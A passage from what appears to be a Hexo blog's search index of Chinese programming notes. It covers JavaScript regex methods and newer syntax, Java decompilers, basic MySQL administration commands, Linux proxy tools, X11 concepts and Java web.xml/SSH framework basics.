<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>exec</td>
<td>一个在字符串中执行查找匹配的RegExp方法，它返回一个数组（未匹配到则返回 null）。</td>
</tr>
<tr>
<td>test</td>
<td>一个在字符串中测试是否匹配的RegExp方法，它返回 true 或 false。</td>
</tr>
<tr>
<td>match</td>
<td>一个在字符串中执行查找匹配的String方法，它返回一个数组，在未匹配到时会返回 null。</td>
</tr>
<tr>
<td>matchAll</td>
<td>一个在字符串中执行查找所有匹配的String方法，它返回一个迭代器（iterator）。</td>
</tr>
<tr>
<td>search</td>
<td>一个在字符串中测试匹配的String方法，它返回匹配到的位置索引，或者在失败时返回-1。</td>
</tr>
<tr>
<td>replace</td>
<td>一个在字符串中执行查找匹配的String方法，并且使用替换字符串替换掉匹配到的子字符串。</td>
</tr>
<tr>
<td>split</td>
<td>一个使用正则表达式或者一个固定字符串分隔一个字符串，并将分隔后的子字符串存储到数组中的 String 方法。</td>
</tr>
</tbody></table>
<h2 id="返回"><a href="#返回" class="headerlink" title="返回"></a>返回</h2><table>
<thead>
<tr>
<th>对象</th>
<th>属性或索引</th>
<th>描述</th>
<th>在例子中对应的值</th>
</tr>
</thead>
<tbody><tr>
<td>myArray</td>
<td></td>
<td>匹配到的字符串和所有被记住的子字符串。</td>
<td>[“dbbd”, “bb”]</td>
</tr>
<tr>
<td>myArray</td>
<td>index</td>
<td>在输入的字符串中匹配到的以0开始的索引值。</td>
<td>1</td>
</tr>
<tr>
<td>myArray</td>
<td>input</td>
<td>初始字符串。</td>
<td>“cdbbdbsbz”</td>
</tr>
<tr>
<td>myArray</td>
<td>[0]</td>
<td>匹配到的所有字符串（并不是匹配后记住的字符串）。注：原文”The last matched characters.”，应该是原版错误。匹配到的最终字符。</td>
<td>“dbbd”</td>
</tr>
<tr>
<td>myRe</td>
<td>lastIndex</td>
<td>下一个匹配的索引值。（这个属性只有在使用g参数时可用在 通过参数进行高级搜索 一节有详细的描述.)</td>
<td>5</td>
</tr>
<tr>
<td>myRe</td>
<td>source</td>
<td>模式文本。在正则表达式创建时更新，不执行。</td>
<td>“d(b+)d”</td>
</tr>
</tbody></table>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var re &#x3D; &#x2F;\w+\s&#x2F;g;</span><br><span class="line">var str &#x3D; &quot;fee fi fo fum&quot;;</span><br><span class="line">var myArray &#x3D; str.match(re);</span><br><span class="line">console.log(myArray);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; [&quot;fee &quot;, &quot;fi &quot;, &quot;fo &quot;]</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://nlrx-wjc.github.io/Learn-Vue-Source-Code/" target="_blank" rel="noopener">逐行剖析 Vue.js 源码</a>,by nlrx.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">正则表达式</a>,by mozilla.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反编译工具</title>
    <url>/2022/06/24/Java%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>常用的Java反编译工具有：</p>
<p>JD-GUI是一个独立的图形实用程序，可显示“.class”文件的Java源代码。您可以使用JD-GUI浏览重构的源代码，以便即时访问方法和字段。</p>
<p>JD Eclipse是Eclipse平台的插件。它允许您在调试过程中显示所有Java源代码，即使您没有全部Java源代码。</p>
<p>JD Core是一个库，它从一个或多个“.class”文件重建Java源代码。JD Core可用于恢复丢失的源代码并探索Java运行时库的源代码。支持Java 5的新特性，如注释、泛型或类型“enum”。JD-GUI和JD Eclipse包括JD核心库。</p>
<p>JD Core、JD-GUI和JD Eclipse是根据GPLv3许可证发布的开源项目。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/6844904128057966605" target="_blank" rel="noopener">超好用的java反编译工具(Java Decompiler)</a>,by 杜春霞.</li>
<li><a href="http://java-decompiler.github.io/" target="_blank" rel="noopener">Java Decompiler</a>,by Java Decompiler.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux MySQL 终端操作</title>
    <url>/2018/05/08/Linux-MySQL-%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<ol>
<li><p>进入mysql数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#mysql -uroot -proot</span><br></pre></td></tr></table></figure></li>
<li><p>创建mysql user</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create user &#39;stock&#39;@&#39;localhost&#39; identified by &#39;stock&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>查询mysql用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SELECT User,Host FROM mysql.user;</span><br><span class="line">+-------+-----------+</span><br><span class="line">| User  | Host      |</span><br><span class="line">+-------+-----------+</span><br><span class="line">| root  | localhost |</span><br><span class="line">| stock | localhost |</span><br><span class="line">+-------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>授予mysql用户权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; GRANT ALL ON stock.* TO &#39;stock&#39;@&#39;localhost&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>使用show语句查找数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>创建数据库stock</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create database stock;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>选择创建的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use stock;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure></li>
<li><p>使用show语句查找数据库中的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [stock]&gt; show tables;</span><br></pre></td></tr></table></figure></li>
<li><p>删除创建的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; drop database stock;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>删除表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop table sequelizemeta;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>查询表结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; desc t_records;</span><br></pre></td></tr></table></figure></li>
<li><p>清除表记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; delete from t_records;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改数据库账号密码</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqladmin -uroot -p123456 password 123</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/117419077" target="_blank" rel="noopener">什么是 MySQL 索引?</a>,by 小灰.</li>
<li><a href="https://www.cnblogs.com/surplus/p/11073877.html" target="_blank" rel="noopener">mysql修改用户密码的方法及命令</a>,by 剩余价值.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript最新语法学习笔记</title>
    <url>/2019/07/28/JavaScript%E6%9C%80%E6%96%B0%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>JavaScript目前发展很快，明年都会出一些新的语法特性。为了便于学习，本文对一些遇到的JavaScript语法特性做一些笔记。</p>
<h1 id="JavaScript版本简介"><a href="#JavaScript版本简介" class="headerlink" title="JavaScript版本简介"></a>JavaScript版本简介</h1><p>JavaScript 由 Brendan Eich 于 1995 年发明，并于 1997 年成为 ECMA 标准。</p>
<p>ECMAScript 是该语言的官方名称。</p>
<p>从 2015 年起，ECMAScript 按年命名（ECMAScript 2015）。</p>
<center>ECMAScript 版本</center>

<table>
<thead>
<tr>
<th>版本</th>
<th>官方名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>ECMAScript 1 (1997)</td>
<td>第一版。</td>
</tr>
<tr>
<td>2</td>
<td>ECMAScript 2 (1998)</td>
<td>只改变编辑方式。</td>
</tr>
<tr>
<td>3</td>
<td>ECMAScript 3 (1999)</td>
<td>添加了正则表达式。添加了 try/catch。</td>
</tr>
<tr>
<td>4</td>
<td>ECMAScript 4</td>
<td>从未发布过。</td>
</tr>
<tr>
<td>5</td>
<td>ECMAScript 5 (2009)</td>
<td>添加了“严格模式”。添加了 JSON 支持。添加了 String.trim()。添加了 Array.isArray()。添加了数组迭代方法。</td>
</tr>
<tr>
<td>5.1</td>
<td>ECMAScript 5.1 (2011)</td>
<td>编辑改变。</td>
</tr>
<tr>
<td>6</td>
<td>ECMAScript 2015</td>
<td>添加了 let 和 const。添加了默认参数值。添加了 Array.find()。添加了 Array.findIndex()</td>
</tr>
<tr>
<td>7</td>
<td>ECMAScript 2016</td>
<td>添加了指数运算符（**）。添加了 Array.prototype.includes。</td>
</tr>
<tr>
<td>8</td>
<td>ECMAScript 2017</td>
<td>添加了字符串填充。添加了新的 Object 属性。添加了异步功能。添加了共享内存。</td>
</tr>
<tr>
<td>9</td>
<td>ECMAScript 2018</td>
<td>添加了 rest / spread 属性。添加了异步迭代。添加了 Promise.finally()。增加 RegExp。</td>
</tr>
</tbody></table>
<h1 id="JavaScript新语法特性"><a href="#JavaScript新语法特性" class="headerlink" title="JavaScript新语法特性"></a>JavaScript新语法特性</h1><h2 id="…运算符"><a href="#…运算符" class="headerlink" title="…运算符"></a>…运算符</h2><p>es6中引入扩展运算符（…），它用于把一个数组转化为用逗号分隔的参数序列，它常用在不定参数个数时的函数调用，数组合并等情形。</p>
<ul>
<li>将实现了 Iterator 接口的对象转为数组</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var nodeList &#x3D; document.querySelectorAll(&#39;div&#39;);  </span><br><span class="line">var array &#x3D; [...nodeList];</span><br></pre></td></tr></table></figure>

<h2 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h2><p>解构赋值语法是一种 Javascript 表达式。通过解构赋值, 可以将属性/值从对象/数组中取出,赋值给其他变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let &#123;a, b, ...rest&#125; &#x3D; &#123;a: 10, b: 20, c: 30, d: 40&#125;</span><br><span class="line">a; &#x2F;&#x2F; 10 </span><br><span class="line">b; &#x2F;&#x2F; 20 </span><br><span class="line">rest; &#x2F;&#x2F; &#123; c: 30, d: 40 &#125;</span><br></pre></td></tr></table></figure>

<h2 id="async函数"><a href="#async函数" class="headerlink" title="async函数"></a>async函数</h2><p>async函数是最新的javascript异步操作方式，初始定义于ES2017。async函数声明用于定义一个返回 AsyncFunction 对象的异步函数。异步函数是指通过事件循环异步执行的函数，它会通过一个隐式的 Promise 返回其结果。但是如果你的代码使用了异步函数，它的语法和结构会更像是标准的同步函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 获取用户信息 *&#x2F;</span><br><span class="line">async function userInfoRoute(req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var decoded &#x3D; jwt.verify(req.body.token.split(&#39; &#39;)[1], appConfig.secretOrPrivateKey);</span><br><span class="line">        var user &#x3D; await models.User.findByPk(decoded.userId);</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            code: 20000,</span><br><span class="line">            data: user</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        res.send(406, &#123;</span><br><span class="line">            message: &#39;Account and password are incorrect.&#39;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* 获取用户信息 *&#x2F;</span><br><span class="line">router.post(&#39;&#x2F;user_info&#39;, userInfoRoute);</span><br></pre></td></tr></table></figure>
<h1 id="ES6-class"><a href="#ES6-class" class="headerlink" title="ES6 class"></a>ES6 class</h1><p>请参考<a href="https://wangjintian.com/2021/04/18/ES6%E7%AF%87-class%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" target="_blank" rel="noopener">ES6篇 - class 基本语法</a>和<a href="https://juejin.cn/post/6844903977419538439" target="_blank" rel="noopener">ES6-Class如何优雅的进行“糖化”</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.w3school.com.cn/js/js_versions.asp" target="_blank" rel="noopener">JavaScript 版本</a>,by w3school.</li>
<li><a href="https://www.jianshu.com/p/86cbabeda999" target="_blank" rel="noopener">ES6 扩展运算符 三个点（…）</a>,by ten5743.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment" target="_blank" rel="noopener">解构赋值</a>,by MDN web docs.</li>
<li><a href="http://www.ruanyifeng.com/blog/2015/05/async.html" target="_blank" rel="noopener">async 函数的含义和用法</a>,by 阮一峰.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/async_function" target="_blank" rel="noopener">async function</a>,by MDN web docs.</li>
<li><a href="https://zhuanlan.zhihu.com/p/84876191" target="_blank" rel="noopener">从面向对象设计角度，全面解读——JS中的函数与对象、Object与Function、以及原型链与继承</a>,by scott.cgi.</li>
<li><a href="https://wangjintian.com/2021/04/18/ES6%E7%AF%87-class%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" target="_blank" rel="noopener">ES6篇 - class 基本语法</a>,by 王锦添.</li>
<li><a href="https://juejin.cn/post/6844903977419538439" target="_blank" rel="noopener">ES6-Class如何优雅的进行“糖化”</a>,by 前端小魔女.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux代理工具简介</title>
    <url>/2019/02/23/Linux%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>下面介绍两个Linux代理工具shadowsock和proxychains。</p>
<h1 id="shadowsock"><a href="#shadowsock" class="headerlink" title="shadowsock"></a>shadowsock</h1><p>Shadowsocks可以指一种基于Socks5代理方式的加密传输协议，也可以指实现这个协议的各种开发包。当前包使用Python、C、C++、C#、Go语言等编程语言开发，大部分主要实现（iOS平台的除外）采用Apache许可证、GPL、MIT许可证等多种自由软件许可协议开放源代码。<strong>Shadowsocks分为服务器端和客户端，在使用之前，需要先将服务器端部署到服务器上面，然后通过客户端连接并创建本地代理。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装方法</span><br><span class="line">sudo apt-get install shadowsocks</span><br><span class="line"># 使用方法</span><br><span class="line">nohup &#x2F;usr&#x2F;bin&#x2F;sslocal -c &#x2F;etc&#x2F;shadowsocks&#x2F;server.json</span><br></pre></td></tr></table></figure>

<h1 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h1><p>ProxyChains是一个开源代理工具，能够强制使任何应用的TCP连接使用SOCKS4,SOCKS或者HTTP(S)代理进行连接。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装配置</span><br><span class="line">sudo apt install proxychains</span><br><span class="line">sudo gedit &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">socks5 127.0.0.1 1080</span><br><span class="line"># 使用方法</span><br><span class="line">proxychains firefoxt</span><br><span class="line">proxychains aria2c</span><br><span class="line">proxychains wget</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Shadowsocks" target="_blank" rel="noopener">Shadowsocks</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/SOCKS" target="_blank" rel="noopener">SOCKS</a>,by wikipedia.</li>
<li><a href="https://linux.cn/article-6836-1.html" target="_blank" rel="noopener">将 Tor socks 转换成 http 代理</a>,by linux 中国.</li>
<li><a href="https://fanzhongwei.com/linux/shadowsocks" target="_blank" rel="noopener">Linux 科学上网</a>,by fanzhongwei.</li>
<li><a href="https://github.com/qingshuisiyuan/electron-ssr-backup/blob/master/Ubuntu.md" target="_blank" rel="noopener">Debian系列——Ubuntu18.04为例</a>,by github.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux图形界面基础知识</title>
    <url>/2018/12/09/Linux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>Linux初学者经常分不清楚linux和X之间，X和Xfree86之间，X和KDE，GNOME等之间是什么关系。常常混淆概念，下面以易于理解的方式解释X，X11，XFREE，WM，KDE，GNOME等之间的关系。</p>
<h1 id="Linux内核没有图形用户界面"><a href="#Linux内核没有图形用户界面" class="headerlink" title="Linux内核没有图形用户界面"></a>Linux内核没有图形用户界面</h1><p>与Windows操作系统内核集成图形用户界面不同，Linux内核没有图形用户界面，是一个基于命令行的操作系统。</p>
<p>linux和Xfree的关系就相当于当年的DOS和 WINDOWS3.0一样，windows3.0不是独立的操作系统，它只是DOS的扩充，是DOS下的应用程序级别的系统，不是独立的操作系统，同样 XFree只是linux下的一个应用程序而已。不是系统的一部分，但是X的存在可以方便用户使用电脑。</p>
<p>WINDOWS95及以后的版本就不一样了，他们 的图形界面是操作系统的一部分，图形界面在系统内核中就实现了，没有了图形界面windows就不成为windows了，但linux却不一样，没有图形 界面linux还是linux，很多装linux的WEB服务器就根本不装X服务器.这也WINDOWS和linux的重要区别之一。</p>
<h1 id="X是协议，不是具体的某个软件"><a href="#X是协议，不是具体的某个软件" class="headerlink" title="X是协议，不是具体的某个软件"></a>X是协议，不是具体的某个软件</h1><p>X 是协议，就像HTTP协议，IP协议一样。一个基于X的应用程序需要运行并显示内容时他就联 接到X服务器，开始用X协议和服务器交谈。</p>
<p>比如一个X应用程序要在屏幕上输出一个圆那么他就用X协议对X服务器说：喂!我需要在屏幕上画一个圆.X应用程 序只负责告诉X服务器在屏幕的什么地方用什么颜色画一个多大的圆，而具体的”画”的动作，比如这个圆如何生成，用什么显卡的驱动程序去指挥显卡完成等等工作是由X服务器来完成的。</p>
<p>X服务器还负责捕捉键盘和鼠标的动作，假设X服务器捕捉到鼠标的左键被按下了，他就告诉X应用程序：亲爱的应用程序先生，我发现 鼠标被按下了，您有什么指示吗?如果X应用程序被设计成当按下鼠标左健后再在屏幕上画一个正方形的话，X应用程序就对X服务器说：请再画一个正方形，当然 他会告诉服务器在什么地方用什么颜色画多大的正方形，但不关心具体怎么画–那是服务器的事情。</p>
<h1 id="XFree86和Xorg是实现X协议的服务器程序"><a href="#XFree86和Xorg是实现X协议的服务器程序" class="headerlink" title="XFree86和Xorg是实现X协议的服务器程序"></a>XFree86和Xorg是实现X协议的服务器程序</h1><p>Xfree86就是这样一个去根据法规实现协议的 “交警”。他按照X协议的规定来完成X应用程序提交的在屏幕上显示的任务。当然不仅仅是某个特定的交警才可以去维护和实现这个法规，比如还可以由交通协管 员来实现交通法规，必要的时候警察也可以介入，当然前提是他们都要懂得交通法规，也就是要懂得协议。</p>
<p>所以实现X协议的软件也并不只有 XFree86，XFree86只是实现X协议的一个免费X服务器软件.商业上常用MOTIF，现在还有XORG，还有很多很小的由爱好者写的小的X服务器软件。</p>
<h1 id="X和X11R6的关系"><a href="#X和X11R6的关系" class="headerlink" title="X和X11R6的关系"></a>X和X11R6的关系</h1><p>X11R6 实际上是 X Protocol version 11 Release 6<br>(X协议第11版第六次发行)的意思，就是说目前用的X协议是第11版的，然后经过了6次小的修正。</p>
<p><strong>不同版本的X协议是不能通信的</strong>。就象我们现在IPV4和IPV6不能通信一样，不过不用担心，现在的X服务器软件和X应用程序都遵循X11R6。</p>
<h1 id="X服务器和WM-window-manager-窗口管理器-的关系"><a href="#X服务器和WM-window-manager-窗口管理器-的关系" class="headerlink" title="X服务器和WM(window manager 窗口管理器)的关系"></a>X服务器和WM(window manager 窗口管理器)的关系</h1><p> 窗口管理器是一种X应用程序，它负责窗口最大化，最小化，移动，关闭窗口等。这些不是X服务器负责完成的。</p>
<h1 id="KDE和GNOME"><a href="#KDE和GNOME" class="headerlink" title="KDE和GNOME"></a>KDE和GNOME</h1><p>KDE 和GNOME是LINUX里最常用的图形界面操作环境，他们不仅仅是一个窗口管理器那么简单， KDE是K Desktop Environment 的缩写。他不仅是一个窗口管理器，还有很多配套的应用软件和方便使用的桌面环境，比如任务栏，开始菜单，桌面图标等等。</p>
<p>GNOME是GNU Network Object Model Environment 的缩写。和KDE一样，也是一个功能强大的综合环境。</p>
<p>另外在其它UNIX系统中，常常使用CDE作为这样一个环境。</p>
<p>其它的小型窗口管理器有: window maker，after step，blackbox，fvwm，fvwm2，等等都是常用的优秀窗口管理器。</p>
<h1 id="linux图形界面层次关系总结"><a href="#linux图形界面层次关系总结" class="headerlink" title="linux图形界面层次关系总结"></a>linux图形界面层次关系总结</h1><p>linux本身–&gt;X服务器&lt;-[通过X协议交谈]-&gt;窗口管理器(综合桌面环境)–&gt;X应用程序。</p>
<p>Xfree86服务器的实现包括两个部分，一部分是和显卡直接打交道的低层，一部分是和X应用程序打交道的上层。</p>
<p>上层负责接收应用程序的请求和鼠标 键盘的动作。而和显卡直接打交道的底层负责指挥显卡生成图形，其实就是显卡驱动。上层接收到应用程序的请求后，将请求内容做适当处理，然后交给显卡驱动来 指挥 显卡完成画图的动作。</p>
<p>另外，上层的捕捉键盘和鼠标动作的部分会向应用程序提供鼠标和键盘的状态信息，应用程序接收到这些信息后决定是否再有相应的动作。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/huang_xw/article/details/9224683" target="_blank" rel="noopener">linux图形界面基本知识(X、X11、Xfree86、Xorg、GNOME、KDE)</a>, by  huang_xw.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Java之SSH框架学习笔记</title>
    <url>/2023/04/03/Java%E4%B9%8BSSH%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最近处理的几个项目都是用Java语言编写的，学习一下。</p>
<h1 id="Web-xml配置文件"><a href="#Web-xml配置文件" class="headerlink" title="Web.xml配置文件"></a>Web.xml配置文件</h1><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><p><listener>为web应用程序定义监听器，监听器用来监听各种事件，比如：application和session事件，所有的监听器按照相同的方式定义，功能取决去它们各自实现的接口，常用的Web事件接口有如下几个：</p>
<ul>
<li>ServletContextListener：用于监听Web应用的启动和关闭；</li>
<li>ServletContextAttributeListener：用于监听ServletContext范围（application）内属性的改变；</li>
<li>ServletRequestListener：用于监听用户的请求；</li>
<li>ServletRequestAttributeListener：用于监听ServletRequest范围（request）内属性的改变；</li>
<li>HttpSessionListener：用于监听用户session的开始和结束；</li>
<li>HttpSessionAttributeListener：用于监听HttpSession范围（session）内属性的改变。</li>
</ul>
<p><listener>主要用于监听Web应用事件，其中有两个比较重要的WEB应用事件：应用的启动和停止（starting up or shutting down）和Session的创建和失效（created or destroyed）。</p>
<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><p>Filter可认为是Servle的一种“加强版”，主要用于对用户请求request进行预处理，也可以对Response进行后处理，是个典型的处理链。使用Filter的完整流程是：Filter对用户请求进行预处理，接着将请求HttpServletRequest交给Servlet进行处理并生成响应，最后Filter再对服务器响应HttpServletResponse进行后处理。Filter与Servlet具有完全相同的生命周期，且Filter也可以通过<init-param>来配置初始化参数，获取Filter的初始化参数则使用FilterConfig的getInitParameter()。</p>
<p>换种说法，Servlet里有request和response两个对象，Filter能够在一个request到达Servlet之前预处理request，也可以在离开Servlet时处理response，Filter其实是一个Servlet链。</p>
<p>以下是Filter的一些常见应用场合：</p>
<ul>
<li>认证Filter</li>
<li>日志和审核Filter</li>
<li>图片转换Filter</li>
<li>数据压缩Filter</li>
<li>密码Filter</li>
<li>令牌Filter</li>
<li>触发资源访问事件的Filter</li>
<li>XSLT Filter</li>
<li>媒体类型链Filter</li>
</ul>
<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>Servlet通常称为服务器端小程序，是运行在服务器端的程序，用于处理及响应客户的请求。Servlet是个特殊的java类，继承于HttpServlet。客户端通常只有GET和POST两种请求方式，Servlet为了响应则两种请求，必须重写doGet()和doPost()方法。</p>
<h2 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h2><p>JavaBeans是Java中一种特殊的类，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。</p>
<h2 id="Web-xml加载顺序"><a href="#Web-xml加载顺序" class="headerlink" title="Web.xml加载顺序"></a>Web.xml加载顺序</h2><blockquote>
<p>总的来说，web.xml的加载顺序是:<context-param>-&gt;<listener>-&gt;<filter>-&gt;<servlet>。其中，如果web.xml中出现了相同的元素，则按照在配置文件中出现的先后顺序来加载。</p>
</blockquote>
<blockquote>
<p>对于某类元素而言，与它们出现的顺序是有关的。以<filter>为例，web.xml中当然可以定义多个<filter>，与<filter>相关的一个元素是<filter-mapping>，注意，对于拥有相同<filter-name>的<filter>和<filter-mapping>元素而言，<filter-mapping>必须出现在<filter>之后，否则当解析到<filter-mapping>时，它所对应的<filter-name>还未定义。web容器启动初始化每个<filter>时，按照<filter>出现的顺序来初始化的，当请求资源匹配多个<filter-mapping>时，<filter>拦截资源是按照<filter-mapping>元素出现的顺序来依次调用doFilter()方法的。<servlet>同<filter>类似，此处不再赘述。</p>
<p>Servlet里有request和response两个对象，Filter能够在一个request到达Servlet之前预处理request，也可以在离开Servlet时处理response，Filter其实是一个Servlet链。</p>
</blockquote>
<h1 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h1><p>请参考<a href="https://www.cnblogs.com/beilou310/p/10436856.html" target="_blank" rel="noopener">Struct2 基础介绍 </a>。</p>
<p align="center">
    <img src="images/sruct2.webp" width="90%" alt="Struct2工作流程"/>
</p>
<center>图1  Struct2工作流程</center>

<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>请参考<a href="https://juejin.cn/post/6844903577077415950" target="_blank" rel="noopener">Spring MVC 解析之 DispatcherServlet</a>。</p>
<p align="center">
    <img src="images/spring.webp" width="90%" alt="Spring工作流程"/>
</p>
<center>图2  Spring工作流程</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/linhuaming/p/9464356.html" target="_blank" rel="noopener">web.xml 配置文件 超详细说明！！！ </a>,by 吴川华仔.</li>
<li><a href="https://blog.51cto.com/u_3664660/3217638" target="_blank" rel="noopener">web.xml文件中加载顺序的优先级 </a>,by laolu0837.</li>
<li><a href="https://www.cnblogs.com/wl0000-03/p/7803276.html" target="_blank" rel="noopener">Spring 、SpringMVC 、Struts2之间的区别</a>,by 刘二雄.</li>
<li><a href="https://www.cnblogs.com/beilou310/p/10436856.html" target="_blank" rel="noopener">Struct2 基础介绍 </a>,by shiyuan310.</li>
<li><a href="https://www.cnblogs.com/javabg/p/7290496.html" target="_blank" rel="noopener">深入Struts2的过滤器FilterDispatcher–中文乱码及字符编码过滤器</a>,by  关键步就几步.</li>
<li><a href="https://blog.csdn.net/zhoucheng05_13/article/details/54142632" target="_blank" rel="noopener">Spring整合Struts2步骤及完整实例</a>,by Star_Ship.</li>
<li><a href="https://zhuanlan.zhihu.com/p/26787293" target="_blank" rel="noopener">Spring和struts2整合详解</a>,by Damon.</li>
<li><a href="https://www.jb51.net/article/178242.htm" target="_blank" rel="noopener">spring整合struts2过程详解</a>,by 西西嘛呦.</li>
